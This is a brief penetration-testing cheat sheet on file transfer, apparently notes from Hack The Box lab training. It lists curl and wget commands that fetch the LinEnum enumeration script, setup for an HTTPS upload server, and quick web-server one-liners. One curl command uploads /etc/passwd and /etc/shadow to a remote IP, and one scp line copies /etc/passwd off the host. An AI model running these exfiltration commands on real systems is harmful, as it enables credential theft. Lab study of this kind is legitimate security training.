
cli tools

curl
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

wget
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
---
https
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
```
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

upload multiple files
```
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

---
web servers

python3
```
python3 -m http.server
```
more info about [[python]]

python2.7
```
python2.7 -m SimpleHTTPServer
```

ruby
```
ruby -run -ehttpd . -p8000
```

php
```
> php -S localhost:8000
```
more info about [[php]]

---
ssh
we can use an SSH server with the `scp` utility to upload files

```
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

